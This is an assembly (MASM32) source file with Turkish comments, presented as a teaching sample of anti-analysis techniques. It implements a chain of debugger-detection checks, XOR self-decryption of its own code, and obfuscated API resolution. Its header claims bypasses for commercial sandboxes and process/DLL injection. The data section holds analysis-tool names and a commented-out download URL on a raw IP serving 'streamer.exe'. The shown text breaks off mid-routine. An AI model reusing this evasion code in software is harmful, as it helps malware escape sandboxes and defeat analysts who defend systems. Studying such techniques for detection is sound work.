; Created by Ibrahim Akgul - OCT 2013
; bilgislem@hotmail.com
; loginit@gmail.com
; https://plus.google.com/+IbrahimAkgul
; http://kernelturk.blogspot.com

; Burada yer alan kodlar, Anti-Sanbox, Debugger Detection, Patch Detection, Anti-Analysis
; Debugger Attacks, Debugger Blocker, VM Detection ve daha bir çok low-level protection 
; teknigini akici ve yalin bir sekilde anlatmak maksadi ile hazirlanmistir. 
; Mumkun oldugunca aciklayici yorumlar eklenmistir. Ancak daha detaylý bilgiler icin
; yazarin http://kernelturk.blogspot.com adli blog sayfasi ziyaret edilebilir.

; Aralik 2013 - 32 bit Process Code ve Dll Injection ornegi eklendi. 
; Subat 2014  - Fireeye Sandbox Bypass yetenegi eklendi.
; Nisan 2014 - 64 bit Process Code Injection ornegi eklendi.
; Ocak 2015 - McAfee ATD Sandbox bypass yetenegi eklendi.
; Mart 2015 - Trend Micro Deep Discovery Analyzer Sandbox Bypass yetenegi eklendi.
; Kasim 2015 - McAfee ATD Sandbox bypass eklendi.

; TO-DO
; streamer.exe:PG$Secure to Avecto bypass 

include \masm32\include\masm32rt.inc
include \masm32\include\psapi.inc
include  \masm32\include\advapi32.inc
include \masm32\include\ntdll.inc
include \masm32\include\shlwapi.inc


;include \masm32\macros\ucmacros.asm ; masm32'nin yeni versiyonuna sahipseniz artik bu macro'ya ihtiyac yok. Derleme sorunu yasarsaniz bu satiri silin!
includelib \masm32\lib\ntdll.lib
includelib \masm32\lib\advapi32.lib
includelib \masm32\lib\psapi.lib
includelib \masm32\lib\urlmon.lib
includelib \masm32\lib\masm32.lib
includelib \masm32\lib\shlwapi.lib


; bypass islemlerimizde kullacagimiz internal structurelar'i global olarak tanimliyoruz

	UNKNOWN STRUCT
		sLength		DWORD ?
		Unknown1 	DWORD ?
		Unknown2 	DWORD ?
		Unknown3 	DWORD ?
		Unknown4 	DWORD ?
		Unknown5 	DWORD ?
		Unknown6 	DWORD ?
		Unknown7 	DWORD ?
		Unknown8 	DWORD ?
	UNKNOWN ENDS
	
	NTCREATETHREADEX typedef proto stdcall :HANDLE,:UINT,:PVOID,:HANDLE,:LPTHREAD_START_ROUTINE,:PVOID,:BYTE,:DWORD,:DWORD,:DWORD,:PVOID
    PNTCREATETHREADEX typedef ptr NTCREATETHREADEX
	PROCESSENTRY32W STRUCT
		dwSize              DWORD ?
		cntUsage            DWORD ?
		th32ProcessID       DWORD ?
		th32DefaultHeapID   DWORD ?
		th32ModuleID        DWORD ?
		cntThreads          DWORD ?
		th32ParentProcessID DWORD ?
		pcPriClassBase      DWORD ?
		dwFlags             DWORD ?
		szExeFile           WCHAR MAX_PATH dup(?)
	PROCESSENTRY32W ENDS

	_OBJECT_TYPE_INFORMATION STRUCT
		TypeName				WCHAR MAX_PATH dup(?)
		TotalNumberOfHandle		DWORD ?
		TotalNumberOfObjects	DWORD ?
	_OBJECT_TYPE_INFORMATION ENDS	
	
	_OBJECT_ALL_INFORMATION STRUCT	
		NumberOfObjectsTypes	DWORD ?
		ObjectTypeInformation 	DWORD _OBJECT_TYPE_INFORMATION[1] dup(?)
	_OBJECT_ALL_INFORMATION ENDS
	
	_PROCESS_BASIC_INFORMATION STRUCT
		Reserved1				DWORD ?
		PebBaseAddress 			DWORD ?
		Reserved2				DWORD ?
		Reserved3				DWORD ?
		UniqueProcessId			DWORD ?
		Ibrahim					DWORD ?
	_PROCESS_BASIC_INFORMATION ENDS
	
	
	ALG_CLASS_DATA_ENCRYPT equ 3 SHL 13
	ALG_TYPE_BLOCK         equ 3 SHL 9
	ALG_SID_AES_128        equ 14
	ALG_SID_AES_192        equ 15
	ALG_SID_AES_256        equ 16
	ALG_CLASS_HASH  	   equ 32768

; PE file .data section 	
.data
sOlly				db "OllyDbg",0
sWinDbg 			db "WinDbgFrameClass",0
sTIda				db	"TIdaWindow",0
sImmun				db	"ID",0
sProcMon 			db "PROCM0N_WINDOW_CLASS",0
sProcExp 			db	"PROCEXPL",0
sProcHck 			db	"ProcessHacker",0
szTestKey 			db 'SYSTEM\\CurrentControlSet\\Control',0
szImmh 				db 'SystemStartOptions',0
szREGSZ 			db  'REG_SZ',0
szFind4Me 			db 'DEBUGPORT',0
inName 				db 'eicar.zip',0
Hedef_Baslik 		db "Putty Configuration",0
Hedef_Sinif 		db "PuTTYConfigBox",0
c_Ntdll 			db "ntdll.dll",0
c_NtCreateThreadEx 	db "NtCreateThreadEx",0
myNameIs			db "streamer.exe",0
szStreamer 			db "streamer.scr",0
strExplorer			db "explorer.exe",0
szTaskBar			db "Shell_TrayWnd",0
trendATD			db "c:\firus",0
lpszLibraryName		db "C:\windows\system32\urlmon.dll",0
szGetTickCount		db "GetTickCount",0
inUrl      			db  "https://secure.eicar.org/eicar_com.zip",0
bDebuggerPresent 	db 0h
dwDebugPort 		dw 0h
i dd 0h
writer 				db 069h,062h,072h,061h,068h,069h,06dh,020h,061h,06bh,067h,075h,06ch,00h
WSTR exStr,"explorer.exe"
WSTR myStr,"streamer.exe"
WSTR sDebugObject,"DebugObject"
;t db "a",0
;Address_Ntdll 		dd 0h
;dwReturnLen 		dw 0h
;WSTR sOlly,"OllyDbg"
;WSTR sWinDbg,"WinDbgFrameClass"
;inUrl  	   			db   0B0h,0E4h,1Fh,05Eh,06Ch,023h,0AFh,0DFh,095h,04Ch,0C1h,001h,070h,0B6h,070h,013h,\
;						 08Ah,0A3h,0F3h,044h,0B8h,0C1h,044h,06Dh,0BDh,0B2h,0D7h,01Fh,06Bh,069h,034h,0FCh,\
;						 0DDh,08Ch,0E8h,0DFh,035h,0B0h,088h,061h,058h,0ACh,05Ah,0DFh,0B7h,06Ah,02Ah,0D5h
;Kern32 				db "Kernel32.dll",0
;LL 					db "LoadLibraryA",0
;pad			       	db  100 dup(0)
;hHash	  			dd  0
;lnGetTickCount		dd SIZEOF szGetTickCount
;inUrl				db "http://5.27.76.174/streamer.exe",0
;lnStreamer			dd SIZEOF szStreamer
;hProv 				dd 0
;hKey2c  			dd 0
;passLen	  			dd SIZEOF pass
;pass	  			db "StreAmeR",0
;ProcessDebugPort 	db 7h
;inUrlLen   			dd  SIZEOF inUrl


.data?
de DEBUG_EVENT <>
sip STARTUPINFO <>
pip	PROCESS_INFORMATION <>
hPid dd ?
hProcess dd ?
pTargetMemory dd ?
pLoadLibrary dd ?
pNtCreateThreadEx dd ?
hThreadID dd ?
szInject64 dd ?
szInject32 dd ?
szEicar dd ?
rBytes dw ? 
hRemoteThread dd ?
dw0 dd ?
dw1 dd ?
hStreamer dd ?
oName dd ?
nBuff db  256 dup(?)
hSnap dd ?	
process32 PROCESSENTRY32W <>
myPid	dd  ?
exPid	dd  ?
sSize dd ?
pMemory dd ?
ntStatus dd ?
NTQ dd ?
pObjectAllInfo dd ?
pObjInfLocation dd ?
pObjectTypeInfo dd ?
NumObjects dd ?
tmp dd ?
hKey dd ?
szBuff db  256 dup(?)
lpcbData dd  ?
pHafiz dd ?
pEskiHali dd ?
dwKorunanKodunHashi dd ?
addrEski	dw ?
addrYeni	dd ?
curDir dd ?
P32NextW dd ?
oldPr dd ?
hTarget dd ?
hPidHandle dd ?
sParentName db  256 dup(?)
hPpid dd ?
szMAX_PATH dd ?
hOwn	dd ?
ppidp _PROCESS_BASIC_INFORMATION <>
szPpid dd ? 
Pbis dd ? 
szPBI dd ?
pMyName dd ?

.code
start:
; dummy code
; Çogu APT analiz ürünü Runtime esnasýnda analiz ettikleri sample'in adýný deðiþtirerek iþe baþlarlar. 
; Böylece her sample için atanan uniqe ve analiz süresince ayný kalan dosya adý sayesinde 
; farkli analiz aþamalarýnda ki bilgi deðiþ tokuþu saðlanmýþ olur. 

mov eax,dword ptr [esp]
xor eax,eax
DecodeMe myStr,02fh, SIZEOF myStr+2
nop
mov edi,edi
nop
; /////// process->name check internals
;push ebp
;mov ebp,esp
;xor ecx,ecx
;xor esi,esi							; db 031h, 0F6h, 
;push esi							; db 056h,
;assume fs:nothing
;mov esi, dword ptr fs:[esi+30h]		; db 064h, 08Bh, 076h, 030h,
;nop
;mov esi, dword ptr ds:[esi+0Ch] 	; db 08Bh, 076h, 0Ch,
;nop
;mov esi, dword ptr ds:[esi+14h] 	; db 08Bh, 076h, 01Ch
;add eax,1
;sub eax,1
;mov esi, dword ptr ds:[esi+28h] 	; db 08Bh, 076h, 028h
;mov edi, offset myStr
;CmpUni esi, edi, sizeof myStr+2  
;test eax,eax
;je _end
;print "Immmmmaaah ",13,10

;;DecodMe trendATD,02fh,SIZEOF trendATD
;invoke GetCurrentDirectory, MAX_PATH,addr curDir
;invoke lstrcmpi,addr curDir, addr trendATD
;test eax,eax
;je _end

;mkdir "C:\SandCastle"
;test eax,eax
;je _end

;invoke CryptAcquireContext, ADDR hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT
;test eax,eax
;je _end
;invoke CryptCreateHash,hProv, ALG_CLASS_HASH or ALG_TYPE_ANY or ALG_SID_MD5, 0, 0, ADDR hHash
;invoke CryptHashData,hHash, ADDR pass, SIZEOF pass, 0
;invoke CryptDeriveKey,hProv,ALG_CLASS_DATA_ENCRYPT or ALG_TYPE_BLOCK or ALG_SID_AES_256,hHash, CRYPT_EXPORTABLE,ADDR hKey2c
;invoke CryptDecrypt, hKey2c, 0, TRUE, 0, ADDR inUrl, ADDR inUrlLen
;test eax,eax
;je _end
;invoke CryptDestroyHash, hHash
;invoke CryptReleaseContext, hProv, 0
mov addrYeni, offset sifrelemeye_basla
;invoke VirtualProtect,addrYeni,01000h, PAGE_EXECUTE_READWRITE, addr addrEski
	NTVirtualProtect typedef PROTO STDCALL :DWORD,:DWORD,:DWORD,:DWORD
	PNTVirtualProtect typedef ptr NTVirtualProtect
	fn GetProcAddress,rv(GetModuleHandle,"kernel32.dll"),"VirtualProtect"
	push eax
	mov ecx, esp
	mov edx,[esp]
	invoke PNTVirtualProtect ptr edx, addrYeni,02000h, PAGE_EXECUTE_READWRITE, addr addrEski
;lea ebx,sifrelemeyi_bitir
;lea edx,sifrelemeye_basla
;sub ebx,edx
;mov ecx,ebx
;xor eax,eax
;mov edi, offset sifrelemeye_basla
;sifrelemeye_devam:
;mov al, byte ptr[edi]
;xor al,02fh
;mov byte ptr[edi],al
;add edi,1
;sub ecx,1
;test ecx,ecx
;jne sifrelemeye_devam
;nop

; ///////// .code section icin decrypt fazi 
lea ebx,sifrelemeyi_bitir
lea edx,sifrelemeye_basla
sub ebx,edx
mov ecx,ebx
xor eax,eax
mov edi, offset sifrelemeye_basla
cozmeye_devam:
mov al, byte ptr[edi]
xor al,02fh
mov byte ptr[edi],al
add edi,1
sub ecx,1
test ecx,ecx
jne cozmeye_devam
nop

jmp deadbeef
db 0deh,0adh,0beh,0efh
deadbeef:
sifrelemeye_basla:

	invoke GetCurrentProcess
	mov dword ptr[hOwn],eax
	mov ecx, sizeof _PROCESS_BASIC_INFORMATION
	mov dword ptr[szPBI],ecx
	NTQUERYINFORMATIONPROCESS typedef proto stdcall :HANDLE,:UINT,:PVOID,:ULONG,:PULONG
    PNTQUERYINFORMATIONPROCESS typedef ptr NTQUERYINFORMATIONPROCESS
	fn GetProcAddress,rv(GetModuleHandle,"ntdll.dll"),"NtQueryInformationProcess"
	push eax	; NtQueryInformationProcess'i call edecegimiz adres eax icinde
	invoke GetCurrentProcess ; eax ezildi yukarýda bu yüzden stack'e push ettik
	mov ecx, esp  
	mov edx, [esp] ; NtQueryInformationProcess'in adresini eax le stacke atmýþtýk þimdi geri alýyoruz
	;NtQueryInformationProcess(hProcess,ProcessBasicInformation,m_pBuffer,sizeof(PROCESS_BASIC_INFORMATION),&retBytes
	invoke PNTQUERYINFORMATIONPROCESS ptr edx,dword ptr[hOwn],0,offset ppidp,dword ptr[szPBI],offset szPpid 
	mov eax,offset ppidp
	assume eax:PTR _PROCESS_BASIC_INFORMATION
	mov ecx, dword ptr[eax].Ibrahim
	assume eax:nothing
	mov dword ptr[hPpid],ecx
	invoke OpenProcess,PROCESS_QUERY_LIMITED_INFORMATION,0,hPpid
	mov dword ptr[hPidHandle],eax

	;invoke QueryFullProcessImageNameA,dword ptr[hExplorer], 0, addr szExplorer,addr MAX_PATH); or as below

	mov dword ptr [szMAX_PATH],MAX_PATH
	NTQueryFullProcessImageName typedef PROTO STDCALL :DWORD,:DWORD,:DWORD,:DWORD
	PNTQueryFullProcessImageName typedef ptr NTQueryFullProcessImageName
	fn GetProcAddress,rv(GetModuleHandle,"kernel32.dll"),"QueryFullProcessImageNameA"
	push eax
	mov ecx, esp
	mov edx, [esp]
	invoke PNTQueryFullProcessImageName ptr edx,dword ptr [hPidHandle],0, addr sParentName, addr [szMAX_PATH]

	mov ecx,offset sParentName
	push ecx
	call WhatIsMyName
	;invoke PathFindFileName,addr sParentName
	pop ecx
	push eax
	DecodeMe strExplorer,02fh, SIZEOF strExplorer
	pop eax
	invoke lstrcmp,eax, addr strExplorer
	test eax,eax
	jne debugger_found_0
	

	DecodeMe myNameIs,02fh, SIZEOF myNameIs
	invoke GetModuleFileName,NULL, addr nBuff,255d
	
	mov ecx,offset nBuff
	push ecx
	call WhatIsMyName
	pop ecx
	;invoke PathFindFileName,addr nBuff
	invoke lstrcmp,eax,addr myNameIs
	test eax,eax
	jne debugger_found_0_1




; phase_1
; Basit bir yontem ile baslayalim. Asagida ki kod blogu meshur IsDebuggerPresent komutunun arka planda
; yaptigi isin aynini yapar. PEB.BeingDebugged flag'i o an calisan processin bir debugger vasitasi ile
; hafizaya alindigi durumlarda sifir disinda bir deger alir. 
	assume fs:nothing 				; fs TIB'u gostermeli. TIB icin bknz:kernelturk.blogspot.com
	mov eax, dword ptr FS:[30h]		; eax artýk peb'i gosteriyor
	movzx eax, byte ptr[eax + 02]	; PEB.BeingDebugged da ki deðeri alalim
	test eax,eax					; 0'mi
	jnz	debugger_found_1			; degilse kod debug ediliyor

;phase_2
;Process'imiz bir debugger tarafýndan hafizaya alindiysa bu flag 0 dýþýnda baþka bir deðer alýr.
	assume fs:nothing
	mov eax, dword ptr FS:[30h]
	cmp byte ptr [eax + 68h], 0 ; debug edilmiyorken PEB.NtGlobalFlag 0 dir.
	jne debugger_found_2

;phase_3
	assume fs:nothing
	xor edx, edx					; FS ile PEB'e ulaþmanýn bir baþka yoðurt yeme þekli
	mov eax, dword ptr FS:[EDX+30h] ; Sonuçta FS:30h olsun yeter
	mov eax, [eax + 18h] 			; eax == PEB.ProcessHeap
	cmp byte ptr [eax + 40h], 2h 	; PEB.ProcessHeap.Flags default deðerleri için kontrol ediyoruz.
	jne	debugger_found_3_1

	cmp dword ptr [eax + 43h], 00 	; PEB.ProcessHeap.ForceFlags default deðerleri için kontrol ediyoruz.
	jne debugger_found_3_2

;phase_4
; Processimiz aktif olarak debug ediliyor ise bu 2 Yontemle tespit edebiliyoruz.
	;invoke CheckRemoteDebuggerPresent,-1, ADDR bDebuggerPresent
	
	DecodeMe bDebuggerPresent,02fh,SIZEOF bDebuggerPresent
	NTCheckRemoteDebuggerPresent typedef PROTO STDCALL :DWORD,:DWORD
	PNTCheckRemoteDebuggerPresent typedef ptr NTCheckRemoteDebuggerPresent
	fn GetProcAddress,rv(GetModuleHandle,"kernel32.dll"),"CheckRemoteDebuggerPresent"
	push eax
	mov ecx, esp
	mov edx, [esp]
	invoke PNTCheckRemoteDebuggerPresent ptr edx, -1, ADDR bDebuggerPresent

	
	
	
	cmp	byte ptr[bDebuggerPresent], 0 ; Bu process aktif debug halinde ise deðer sýfýr deðildir
	jne debugger_found_4_1

; Asagidaki kod blogu CheckRemoteDebuggerPresent api'sinin usermode da yer alan internal halidir.
; Aslinda yaptigi asagidakilerden ibarettir.
	
	
	DecodeMe dwDebugPort,02fh,SIZEOF dwDebugPort
	NTQUERYINFORMATIONPROCESS typedef proto stdcall :HANDLE,:UINT,:PVOID,:ULONG,:PULONG
    PNTQUERYINFORMATIONPROCESS typedef ptr NTQUERYINFORMATIONPROCESS
	
	fn GetProcAddress,rv(GetModuleHandle,"ntdll.dll"),"NtQueryInformationProcess"
	push eax	; NtQueryInformationProcess'i call edecegimiz adres eax icinde
	invoke GetCurrentProcess ; eax ezildi yukarýda bu yüzden stack'e push ettik
	mov ecx, esp  
	mov edx, [esp] ; NtQueryInformationProcess'in adresini eax le stacke atmýþtýk þimdi geri alýyoruz
	invoke PNTQUERYINFORMATIONPROCESS ptr edx,eax,7,addr dwDebugPort,4,NULL ;7 = ProcessDebugPort
	pop edx
	cmp byte ptr [dwDebugPort], 0 ; deðer sýfýr dýþýnda bir þey ise debug ediliyoruz.
	jne debugger_found_4_2

; phase_5
; Processinizi biri debugger ile açmýþ ve üstüne birde step step kodlarý analiz ediyorsa bunu anlamak
; için aþaðýda ki kod bloðunu devreye sokuyoruz. 
	push exception_handler	; process içinde bu alanda oluþacak exception'larý biz handle edeceðiz
	push dword ptr [FS:0]	; TIB'dan yararlanarak kendi SEH (Structured Exception Handling) yapýmýzý kuruyoruz
	mov dword ptr [FS:0], esp ; artýk herhangi bir exception türediðinde bizim kodlarýmýz çalýþacak
	
	;kendi kontrolümüzde bir trap yapalým.
	xor eax,eax
	int 3 ;bu kesme sonrasý bizim handler çalýþmalý
	
	pop dword ptr [FS:0]
	add esp, 4
	
	test eax, eax ;kendi handlerimiza uðradýysak eax = 0ffffffffh olmalý
	je debugger_found_5

;phase_6
; Kodumuz debugger dýþýnda çalýþtýðýnda iki opcode arasý geçen zaman mikrosaniyeler civarýnda olur
; Ancak debug edilirken step step yapýlan analizlerde bu zaman gayet uzun olabiliyor. Bizde bundan
; yararlanarak iki opcode arasý zaman farkýný ölçerek belirlediðimiz limiti aþmasý durumunda debug
; altýnda olduðumuzu anlýyabiliyoruz.

	;invoke GetTickCount
	DecodeMe szGetTickCount,02fh,SIZEOF szGetTickCount
	NTGetTickCount typedef PROTO STDCALL
	PNTGetTickCount typedef ptr NTGetTickCount
	fn GetProcAddress,rv(GetModuleHandle,"kernel32.dll"),addr szGetTickCount
	push eax
	mov ecx,esp
	mov edx,[esp]
	invoke PNTGetTickCount ptr edx
	mov esi,eax

	NTGetTickCount typedef PROTO STDCALL
	PNTGetTickCount typedef ptr NTGetTickCount
	fn GetProcAddress,rv(GetModuleHandle,"kernel32.dll"),addr szGetTickCount
	push eax
	mov ecx,esp
	mov edx,[esp]
	invoke PNTGetTickCount ptr edx
	sub eax,esi
	cmp eax,0400h
	ja debugger_found_6
	
; phase_7
; Normalde bir process	çalýþýrken SeDebugPrivilege tokeni disable durumdadýr.
; Lakin olly ve windbg gibi bir debugger ile debug ediliyorsa SeDebugPrivilege tokeni enable'dir
; Normal yetkilerde calisan bir process CSRSS.exe adli process'e erisemez ve erismek icin SeDebugPrivilege
; tokenine sahip olmalýdýr. Bizde bu trick'i kullanarak trace edilen kodumuzdan csrss.exe processine
; erismeyi deneyeceðiz. Eger erisebilirsek process'imiz debug ediliyor demektir .net

	CSRGETPROCESSID typedef proto stdcall 
    PCSRGETPROCESSID typedef ptr CSRGETPROCESSID
	
	NTOPENPROCESS typedef proto stdcall :HANDLE,:PBYTE,:HANDLE 
    PNTOPENPROCESS typedef ptr NTOPENPROCESS
		
	fn GetProcAddress,rv(GetModuleHandle,"ntdll.dll"),"CsrGetProcessId" ;Csrss.exe'nin bu func ile alacaðýz
	push eax ;adres eax de
	mov ecx, esp
	mov edx, [esp] ;artýk edx'de
	invoke PCSRGETPROCESSID ptr edx
	mov esi,eax ;csrss.exe pid'i esi de
	push esi
	fn GetProcAddress,rv(GetModuleHandle,"ntdll.dll"),"NtOpenProcess"
	push eax
	mov ecx, esp
	mov edx, [esp]
	invoke PNTOPENPROCESS ptr edx, 0400h, 0, esi ;csrss'e eriþmeyi dene
	test eax,eax ;erisebilirsek eax==0
	je debugger_found_7
	nop

; phase_8
; Bildiðiniz gibi her usermode process'inin birde parent'i oluyor ve bu parent genelde Explorer.exe'dir
; Bizde aþaðýda ki kod bloðu ile kendi aktif parent process'imizi bulacaðýz ve eðer explorer.exe deðil ise
; reverser'imizi (bu siz oluyorsunuz) cezalandýracaðýz.
	invoke GetCurrentProcessId
	mov dword ptr [myPid],eax
	DecodeMe exStr,02fh,SIZEOF exStr+2
	DecodeMe myStr,02fh,SIZEOF myStr+2
	;invoke CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS+TH32CS_SNAPMODULE,0 ;process list'e eriþim isteði yapiyoruz
	NTCreateToolhelp32Snapshot typedef PROTO STDCALL :DWORD,:DWORD
	PNTCreateToolhelp32Snapshot typedef ptr NTCreateToolhelp32Snapshot
	fn GetProcAddress,rv(GetModuleHandle,"kernel32.dll"),"CreateToolhelp32Snapshot"
	push eax
	mov ecx,esp
	mov edx,[esp]
	invoke PNTCreateToolhelp32Snapshot ptr edx,TH32CS_SNAPPROCESS+TH32CS_SNAPMODULE,0
	mov hSnap,eax
	mov edx, offset process32 ; process bilgileri bu yapiya dolacak
	mov dword ptr[edx], sizeof PROCESSENTRY32W
	;invoke Process32FirstW,hSnap,addr process32 ; ilk processden baþlýyoruz
	NTProcess32FirstW typedef PROTO STDCALL :DWORD,:DWORD
	PNTProcess32FirstW typedef ptr NTProcess32FirstW
	fn GetProcAddress,rv(GetModuleHandle,"kernel32.dll"),"Process32FirstW"
	push eax
	mov ecx,esp
	mov edx,[esp]
	invoke PNTProcess32FirstW ptr edx,hSnap,addr process32	
	or eax,eax
	jz debugger_not_found ;aslinda hata basmali ama usengeclik
	;	mov dword ptr[P32NextW],edx
repeatme:
; explorer.exe pid icin aslinda GetShellWindow kullanabiliriz Buradaki senaryo reverser'in isini zorlastirmak oldugundan
; daha dolayli yolari tercih ediyoruz. 
	invoke lstrcmpW, addr exStr, addr [process32.szExeFile] ;explorer.exe stringini arýyoruz
; masm32 macrolari ile cmp eax,0 jz xxx yerine alisildik .if conditinoal'larini kullanabiliyoruz.
	.IF (eax == 0)
		mov edi, dword ptr [process32.th32ProcessID] ; explorer.exe stringini bulduk ve pid'sini alýyoruz
		mov dword ptr[exPid],edi
		xor edi,edi ; edi nin degeri sonraki fazlar icin sikinti cikarmasin diye sifirliyoruz
		jmp beFree ; buldugumuza gore simdi kendi process'imizin parentid'si ni alalim.
	.ENDIF
	;invoke Process32NextW,hSnap,addr process32
	NTProcess32NextW typedef PROTO STDCALL :DWORD,:DWORD
	PNTProcess32NextW typedef ptr NTProcess32NextW
	fn GetProcAddress,rv(GetModuleHandle,"kernel32.dll"),"Process32NextW"
	push eax
	mov ecx,esp
	mov edx,[esp]
	invoke PNTProcess32NextW ptr edx,hSnap,addr process32
	or eax,eax
	pop eax
	jnz	repeatme
beFree:
;	invoke CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS+TH32CS_SNAPMODULE,0
	NTCreateToolhelp32Snapshot typedef PROTO STDCALL :DWORD,:DWORD
	PNTCreateToolhelp32Snapshot typedef ptr NTCreateToolhelp32Snapshot
	fn GetProcAddress,rv(GetModuleHandle,"kernel32.dll"),"CreateToolhelp32Snapshot"
	push eax
	mov ecx,esp
	mov edx,[esp]
	invoke PNTCreateToolhelp32Snapshot ptr edx,TH32CS_SNAPPROCESS+TH32CS_SNAPMODULE,0
	mov hSnap,eax
	mov edx, offset process32
	mov dword ptr[edx], sizeof PROCESSENTRY32W
;	invoke Process32FirstW,hSnap,addr process32
	NTProcess32FirstW typedef PROTO STDCALL :DWORD,:DWORD
	PNTProcess32FirstW typedef ptr NTProcess32FirstW
	fn GetProcAddress,rv(GetModuleHandle,"kernel32.dll"),"Process32FirstW"
	push eax
	mov ecx,esp
	mov edx,[esp]
	invoke PNTProcess32FirstW ptr edx,hSnap,addr process32	
	or eax,eax
	jz debugger_not_found

repeatme2:
	invoke lstrcmpW, addr myStr, addr [process32.szExeFile]
	.IF (eax == 0)
		mov eax, dword ptr[exPid]
		cmp eax,dword ptr[process32.th32ParentProcessID] ;parent process'imizin pid'si explorer.exe nin pid ile ayni mi?
		jne debugger_found_8
	.ENDIF
;	invoke Process32NextW,hSnap,addr process32
	NTProcess32NextW typedef PROTO STDCALL :DWORD,:DWORD
	PNTProcess32NextW typedef ptr NTProcess32NextW
	fn GetProcAddress,rv(GetModuleHandle,"kernel32.dll"),"Process32NextW"
	push eax
	mov ecx,esp
	mov edx,[esp]
	invoke PNTProcess32NextW ptr edx,hSnap,addr process32
	or eax,eax
	pop eax
	jnz	repeatme2

; phase_9
; Bu yontem ile process'imizin debug edilip edilmedigine bakmaksizin, o an sistem uzerinde 
; aktif bir debugger olup olmadiginin kontrolunu yapacagiz. Bu kontrol kernel nesnesinden bilgi aldigindan
; algilama mekanizmasinin daha hassas oldugundan bahsedilebilir. DebugObject nesnesi tipki Process,
; Job, Section, Device, File vb.. 42 adet (windows 7x64 de en son sayi buydu) nesneden biridir.
; Bu nesne o an sistemde aktif olan debug session'larinin sayisini tutar. Hic bir debug session'u olmadiginida
; bu sayi hali ile sifir olacaktir. Bizde simdi bu nesneyi sorgulayip aktif bir debug sessionu var mi ona bakacagiz.

	DecodeMe i,02fh,SIZEOF i
	DecodeMe sDebugObject,02fh,SIZEOF sDebugObject+2
	NTQUERYOBJECT typedef proto stdcall :HANDLE,:UINT,:PVOID,:ULONG,:PULONG
    PNTQUERYOBJECT typedef ptr NTQUERYOBJECT
	fn GetProcAddress,rv(GetModuleHandle,"ntdll.dll"),"ZwQueryObject" ;DebugObject nesnesini sorgulamak icin ihtiyacimiz olan API
	push eax
	invoke GetCurrentProcess
	mov ecx, esp
	mov edx, [esp]
	mov dword ptr[NTQ], edx
	invoke PNTQUERYOBJECT ptr NTQ,NULL,3,addr sSize,4, addr sSize ; Ilk olarak sizing sorunumuzu halledelim
	;invoke VirtualAlloc,NULL,addr sSize, MEM_RESERVE+MEM_COMMIT,PAGE_READWRITE ; yukaridan donen ihtiyaca binaen alanimizi aciyoruz
	NTVirtualAlloc typedef PROTO STDCALL :DWORD,:DWORD,:DWORD,:DWORD
	PNTVirtualAlloc typedef ptr NTVirtualAlloc
	fn GetProcAddress,rv(GetModuleHandle,"kernel32.dll"),"VirtualAlloc"
	push eax
	mov ecx,esp
	mov edx,[esp]
	invoke PNTVirtualAlloc ptr edx,NULL,addr sSize, MEM_RESERVE+MEM_COMMIT,PAGE_READWRITE
	mov dword ptr[pMemory], eax
	.IF (eax == 0)
		jmp debugger_not_found
	.ENDIF
	invoke PNTQUERYOBJECT ptr NTQ,-1,3, pMemory,sSize,NULL ; artik tum nesnelere ait listeyi alabiliriz.
	mov dword ptr[ntStatus],eax
	.IF (eax != 0)
	;invoke VirtualFree,addr pMemory,0,MEM_RELEASE
	NTVirtualFree typedef PROTO STDCALL :DWORD,:DWORD,:DWORD
	PNTVirtualFree typedef ptr NTVirtualFree
	fn GetProcAddress,rv(GetModuleHandle,"kernel32.dll"),"VirtualFree"
	push eax
	mov ecx,esp
	mov edx,[esp]
	invoke PNTVirtualFree ptr edx,addr pMemory,0,MEM_RELEASE
		retn
	.ENDIF
	assume eax:PTR _OBJECT_ALL_INFORMATION ; tüm nesne bilgileri bu array'de yer alacak
	mov eax, dword ptr [pMemory]
	mov dword ptr [pObjectAllInfo],eax
	mov ecx, dword ptr [eax].NumberOfObjectsTypes ;kac tane nesne bulduk, bu sayiya gore dongu kurup DebugObject nesnesini bulacagiz
	mov eax, dword ptr[pObjectAllInfo]
	assume eax:NOTHING

	;biraz pointer aritmetiði yapýyoruz
	add	eax, 4 
	mov dword ptr [pObjInfLocation], eax
	mov eax,dword ptr [pObjectAllInfo] ;
	mov ecx,dword ptr [eax]
	mov dword ptr [NumObjects],ecx
	mov dword ptr [i],0h	
	
turn_ever:
	mov eax, dword ptr [pObjInfLocation]
	sub eax,4
	mov	dword ptr [pObjectTypeInfo], eax
	assume eax:PTR _OBJECT_TYPE_INFORMATION
	mov ecx, dword ptr [i]
	add ecx, 1
	mov dword ptr [i],ecx
	cmp ecx, dword ptr[NumObjects]
	jae turn_never
	; unicode bir yapi ile calistigimizdan buffer alanina ulasmamiz gerek
	mov eax, dword ptr [eax].TypeName + 08h 
	invoke lstrcmpW, addr sDebugObject,eax ; DebugObject nesnesini ariyoruz
	.IF (eax == 0)
	;bulduk kontrol ediyoruz
		mov eax, dword ptr [pObjInfLocation]
		mov	dword ptr [pObjectTypeInfo], eax
		assume eax:PTR _OBJECT_TYPE_INFORMATION
		;(pObjectTypeInfo->TotalNumberOfObjects > 0) dan buyuk ise sistemde aktif bir debug session'i var demektir.
		.IF (dword ptr[eax+0Ch] > 0) 
			;invoke VirtualFree,addr pMemory,0,MEM_RELEASE
			NTVirtualFree typedef PROTO STDCALL :DWORD,:DWORD,:DWORD
			PNTVirtualFree typedef ptr NTVirtualFree
			fn GetProcAddress,rv(GetModuleHandle,"kernel32.dll"),"VirtualFree"
			push eax
			mov ecx,esp
			mov edx,[esp]
			invoke PNTVirtualFree ptr edx,addr pMemory,0,MEM_RELEASE
			assume eax:nothing
			jmp debugger_found_9
		.ELSE
			;invoke VirtualFree,addr pMemory,0,MEM_RELEASE
			NTVirtualFree typedef PROTO STDCALL :DWORD,:DWORD,:DWORD
			PNTVirtualFree typedef ptr NTVirtualFree
			fn GetProcAddress,rv(GetModuleHandle,"kernel32.dll"),"VirtualFree"
			push eax
			mov ecx,esp
			mov edx,[esp]
			invoke PNTVirtualFree ptr edx,addr pMemory,0,MEM_RELEASE

			assume eax:nothing
			jmp turn_never	
		.ENDIF
	.ENDIF	
	; array'de ki su an bulunan object'in adini ogrenmek icin girisimlerimize basliyoruz
	add dword ptr [pObjectTypeInfo],04h 
	mov eax, dword ptr [pObjectTypeInfo]
	assume eax:PTR _OBJECT_TYPE_INFORMATION
	; mevcut obje'ye ait pointer table'dan objenin ismini içeren unicode degerin adresini aliyoruz.
